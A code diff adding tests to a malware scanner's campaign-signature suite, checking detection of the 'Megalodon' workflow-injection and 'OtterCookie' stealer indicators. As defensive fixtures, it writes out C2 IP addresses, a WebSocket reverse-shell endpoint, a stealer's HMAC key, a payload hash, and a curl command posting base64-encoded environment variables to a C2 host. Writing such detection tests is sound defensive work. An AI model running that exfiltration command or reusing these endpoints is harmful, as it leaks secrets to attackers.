@@ -1340,4 +1340,100 @@ describe("Campaign Signatures", () => {
       expect(finding?.severity).toBe("critical");
     });
   });
+
+  // =================================================================
+  // Megalodon GitHub Actions workflow injection (May 22, 2026)
+  // =================================================================
+
+  describe("Megalodon GitHub Workflow Injection (May 2026)", () => {
+    it("should detect 216.126.225.129 Megalodon C2 IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "ip.js"),
+        'const c2 = "216.126.225.129";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_IP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect Megalodon C2 endpoint pattern with port", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "exfil.sh"),
+        'curl -X POST http://216.126.225.129:8443 -d "$(env | base64)"'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "MEGALODON_C2_ENDPOINT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // DPRK OtterCookie Node.js stealer (SANS ISC 33006, May 22, 2026)
+  // =================================================================
+
+  describe("DPRK OtterCookie Node.js Stealer (May 2026)", () => {
+    it("should detect 216.126.225.243 OtterCookie C2 IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "ip.js"),
+        'const c2 = "216.126.225.243";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_IP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect OtterCookie WebSocket reverse shell endpoint", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "rev.js"),
+        'const ws = new WebSocket("ws://216.126.225.243:8087/api/notify");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "OTTERCOOKIE_C2_ENDPOINT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect hardcoded SuperStr0ngSecret HMAC key", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "stealer.js"),
+        'const KEY = "SuperStr0ngSecret@)@^";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "OTTERCOOKIE_HMAC_KEY"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect OtterCookie payload SHA256", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "hashlist.js"),
+        'const h = "049300aa5dd774d6c984779a0570f59610399c71864b5d5c2605906db46ddeb9";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
